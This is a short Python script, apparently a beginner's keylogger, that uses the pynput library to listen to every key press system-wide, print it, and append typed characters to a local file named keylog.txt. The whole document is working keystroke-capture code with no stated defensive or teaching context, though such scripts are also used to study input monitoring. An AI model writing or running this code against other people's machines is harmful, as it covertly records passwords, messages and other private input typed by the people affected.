from pynput import keyboard
from pynput.keyboard import Key, Listener

def keyPressed(key):
    print(str(key))
    with open ("keylog.txt", "a") as file:
        try:
            char = key.char
            file.write(char)
        except:
            print("error")

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

